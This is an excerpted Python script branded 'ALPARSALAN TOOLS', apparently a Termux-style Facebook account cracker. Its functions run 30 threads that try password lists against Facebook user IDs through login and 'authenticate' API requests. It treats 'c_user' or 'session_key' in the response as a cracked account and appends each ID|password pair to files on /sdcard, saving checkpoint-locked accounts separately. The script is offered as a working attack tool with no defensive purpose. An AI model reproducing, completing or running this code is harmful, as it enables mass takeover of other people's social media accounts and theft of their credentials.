...
os.system("xdg-open https://www.facebook.com/profile.php?id=100088392859656/")
print('\n\033[1;36m   WELCOME TO ALPARSALAN TOOLS...');time.sleep(3)
...
logo = """\033[1;97m
   _____  .____   __________  _____ __________  _________   _____  .____       _____    _______   
  /  _  \ |    |  \______   \/  _  \\______   \/   _____/  /  _  \ |    |     /  _  \   \      \  
 /  /_\  \|    |   |     ___/  /_\  \|       _/\_____  \  /  /_\  \|    |    /  /_\  \  /   |   \ 
/    |    \    |___|    |  /    |    \    |   \/        \/    |    \    |___/    |    \/    |    \
\____|__  /_______ \____|  \____|__  /____|_  /_______  /\____|__  /_______ \____|__  /\____|__  /
        \/        \/               \/       \/        \/         \/        \/       \/         \/ 
...
def file_cloning():
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print("\033[1;32m [+] OK IDZ SAVE ✓ ALPARSALAN-OK.txt")
                                        print("\033[1;32m [+] CP IDZ SAVE × ALPARSALAN-CP.txt")
                                        print("\033[1;32m [+] WE ARE ALPARSALAN HACK ")
                                        print('\033[1;97m [+]-------------------------------------------------------')
...
def afgan():
                ...
                with tred(max_workers=30) as AWM:     
                        ...
                        print('\033[1;97m [+]-------------------------------------------------------')
                        print("\033[1;97m [+]\033[1;32m OK IDZ SAVE ✓ ALPARSALAN-OK.txt")
                        print("\033[1;97m [+]\033[1;32m CP IDZ SAVE × ALPARSALAN-CP.txt")
                        print("\033[1;97m [+]\033[1;32m WE ARE ALPARSALAN HACK ")
                        print('\033[1;97m [+]-------------------------------------------------------')
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALPARSALAN-F1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AWM:
                                ...
                                print('\r\r\033[1;32m [ALPARSALAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/M_TECH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AWM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ALPARSALAN-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ALPARSALAN-F2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ALPARSALAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [ALPARSALAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ALPARSALAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [ALPARSALAN-R] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ALPARSALAN-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ALPARSALAN-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/WAHID-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ALPARSALAN-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/WAHID-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
